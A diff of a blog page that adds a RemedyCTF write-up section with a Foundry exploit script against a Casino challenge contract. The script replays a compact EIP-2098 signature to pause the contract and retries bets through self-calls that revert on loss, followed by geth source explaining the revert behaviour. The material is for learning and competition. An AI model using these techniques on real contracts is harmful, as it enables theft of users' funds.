@@ -627,6 +627,69 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -700,6 +763,28 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
       
 
       
@@ -838,9 +923,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="4040 words"
+  title="4849 words"
 >
-  <em>22 min</em> read</span>
+  <em>26 min</em> read</span>
 
       </div>
       <!-- .d-flex -->
@@ -2447,6 +2532,283 @@ contract Callllll {
 
 <p><a href="/assets/img/2025/remedyCTF/image5.png" class="popup img-link  shimmer"><img src="/assets/img/2025/remedyCTF/image5.png" alt="" loading="lazy"></a>
 he says if we call some function with the <code class="language-plaintext highlighter-rouge">.call()</code> function, only the transaction performed through <code class="language-plaintext highlighter-rouge">.call()</code> function is reverted.. so i wrote test code as above, when i called the <code class="language-plaintext highlighter-rouge">asdf1()</code> function, it was reverted before transaction was performed but when i call the <code class="language-plaintext highlighter-rouge">asdf11()</code> it was just reverted the transaction which performed via <code class="language-plaintext highlighter-rouge">.call()</code> function. so we can just exploit with this trick to get winning.</p>
+
+<h3 id="solvesol-2"><span class="me-2">Solve.sol</span><a href="#solvesol-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.28;
+
+import "forge-std/Script.sol";
+import "../src/Challenge.sol";
+import "../src/Casino.sol";
+
+contract Solve is Script {
+    address public PLAYER;
+    address public SIGNER;
+    address public challengeAddress = 0xE11F8942C5Cf5Ccab5FB69e6F8A57aAB66779b3c;
+    uint256 public playerPrivateKey = 0x346b49a856db3bdd7fb2d4b126051630cc0851fb7c85bb2dab397d07e6a134d1;
+    uint256 public targetBalance = uint256(~~~address(casino).balance);
+
+    Challenge public challenge;
+    Casino public casino;
+    constructor() {
+        challenge = Challenge(challengeAddress);
+        PLAYER = challenge.PLAYER();
+        casino = challenge.CASINO();
+        SIGNER = casino.signer();
+    }
+
+    function convertToEIP2098(bytes32 r, bytes32 s, uint8 v) public pure returns (bytes32, bytes32) { // by ChatGPT Ammmeennn
+        require(v == 27 || v == 28, "Invalid v value");
+        bytes32 vs = s | bytes32(uint256(v - 27) &lt;&lt; 255);
+        return (r, vs);
+    }
+    function t(uint256 a) pure public returns (uint256) {
+        return ~~~(uint256(a));
+    }
+
+    function splitSignature(bytes memory signature)
+        public
+        pure
+        returns (bytes32 r, bytes32 s, uint8 v)
+    {
+        require(signature.length == 65, "Invalid signature length");
+
+        assembly {
+            r := mload(add(signature, 0x20))
+            s := mload(add(signature, 0x40))
+            v := byte(0, mload(add(signature, 0x60)))
+        }
+    }
+
+    function run() external {
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        bytes32 vs;
+        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
+
+        bytes memory signature = hex"32740cc719bfdb5f10af41671b9dc16affeea5cb88d7abacebdded60cdc50a6d46c86e7ad26a56e4e77c307047a02f7c3d0d91bb91428f2b392643781ea89b4c1c";
+        (r, s, v) = splitSignature(signature);
+        (r, vs) = convertToEIP2098(r, s, v);
+
+        vm.startBroadcast(playerPrivateKey);
+        console.log("casino balance : ", address(casino).balance);
+        console.log("player balance : ", address(PLAYER).balance);
+        console.log("signer address : ", SIGNER);
+
+        casino.pause(abi.encodePacked(r, vs), salt);
+        casino.deposit{value:0.2 ether}(address(this));
+        console.log("puase : ", casino.paused());
+        console.log("casino player balance before bet() : ", casino.balances(address(this)));
+        attack();
+        console.log("casino player balance after bet() : ", casino.balances(address(this)));
+        //console.log("isSolved : ", challenge.isSolved());
+        vm.stopBroadcast();
+    }
+
+    function attack() public {
+        while (casino.balances(address(this)) &lt; targetBalance) {
+            uint256 amount = casino.balances(address(this));
+            uint256 _amount;
+            if (targetBalance - amount &lt;= amount) {
+                _amount = targetBalance - amount;
+            } else {
+                _amount = amount;
+            }
+            address(this).call(abi.encodeWithSignature("call_bet(uint256)", _amount));
+        }
+    }
+
+    function call_bet(uint256 amount) public {
+        casino.bet(amount);
+        uint256 after_amt = casino.balances(address(this));
+        if (after_amt &gt; amount) {
+            return;
+        }
+        revert();
+    }
+}
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/img/2025/remedyCTF/image6.png" class="popup img-link  shimmer"><img src="/assets/img/2025/remedyCTF/image6.png" alt="" loading="lazy"></a></p>
+
+<p>so we can just exploit with this trick to get winning. and then we should call the <code class="language-plaintext highlighter-rouge">reset()</code> function to withdraw money</p>
+
+<h3 id="why-arent-all-transactions-reverted"><span class="me-2">why aren’t all transactions reverted?</span><a href="#why-arent-all-transactions-reverted" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<pre><code class="language-Go">func (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *uint256.Int) (ret []byte, leftOverGas uint64, err error) {
+	// Capture the tracer start/end events in debug mode
+	if evm.Config.Tracer != nil {
+		evm.captureBegin(evm.depth, CALL, caller.Address(), addr, input, gas, value.ToBig())
+		defer func(startGas uint64) {
+			evm.captureEnd(evm.depth, startGas, leftOverGas, ret, err)
+		}(gas)
+	}
+	// Fail if we're trying to execute above the call depth limit
+	if evm.depth &gt; int(params.CallCreateDepth) {
+		return nil, gas, ErrDepth
+	}
+	// Fail if we're trying to transfer more than the available balance
+	if !value.IsZero() &amp;&amp; !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {
+		return nil, gas, ErrInsufficientBalance
+	}
+	snapshot := evm.StateDB.Snapshot()
+	p, isPrecompile := evm.precompile(addr)
+
+	if !evm.StateDB.Exist(addr) {
+		if !isPrecompile &amp;&amp; evm.chainRules.IsEIP4762 &amp;&amp; !isSystemCall(caller) {
+			// add proof of absence to witness
+			wgas := evm.AccessEvents.AddAccount(addr, false)
+			if gas &lt; wgas {
+				evm.StateDB.RevertToSnapshot(snapshot)
+				return nil, 0, ErrOutOfGas
+			}
+			gas -= wgas
+		}
+
+		if !isPrecompile &amp;&amp; evm.chainRules.IsEIP158 &amp;&amp; value.IsZero() {
+			// Calling a non-existing account, don't do anything.
+			return nil, gas, nil
+		}
+		evm.StateDB.CreateAccount(addr)
+	}
+	evm.Context.Transfer(evm.StateDB, caller.Address(), addr, value)
+
+	if isPrecompile {
+		ret, gas, err = RunPrecompiledContract(p, input, gas, evm.Config.Tracer)
+	} else {
+		// Initialise a new contract and set the code that is to be used by the EVM.
+		// The contract is a scoped environment for this execution context only.
+		code := evm.resolveCode(addr)
+		if len(code) == 0 {
+			ret, err = nil, nil // gas is unchanged
+		} else {
+			addrCopy := addr
+			// If the account has no code, we can abort here
+			// The depth-check is already done, and precompiles handled above
+			contract := NewContract(caller, AccountRef(addrCopy), value, gas)
+			contract.IsSystemCall = isSystemCall(caller)
+			contract.SetCallCode(&amp;addrCopy, evm.resolveCodeHash(addrCopy), code)
+			ret, err = evm.interpreter.Run(contract, input, false)
+			gas = contract.Gas
+		}
+	}
+	// When an error was returned by the EVM or when setting the creation code
+	// above we revert to the snapshot and consume any gas remaining. Additionally,
+	// when we're in homestead this also counts for code storage gas errors.
+	if err != nil {
+		evm.StateDB.RevertToSnapshot(snapshot)
+		if err != ErrExecutionReverted {
+			if evm.Config.Tracer != nil &amp;&amp; evm.Config.Tracer.OnGasChange != nil {
+				evm.Config.Tracer.OnGasChange(gas, 0, tracing.GasChangeCallFailedExecution)
+			}
+
+			gas = 0
+		}
+		// TODO: consider clearing up unused snapshots:
+		//} else {
+		//	evm.StateDB.DiscardSnapshot(snapshot)
+	}
+	return ret, gas, err
+}
+</code></pre>
+<p>we can find the call’s code in geth. the <code class="language-plaintext highlighter-rouge">call()</code> function creates new Contract to execute the bytecode. so new contract will be reverted when the revert() function is called and that’s why all transaction aren’t reverted</p>
 
 <p>i feel again that it is always very important to know the specifications of the system like EVM or smth else, i still have a lot to learn</p>
 
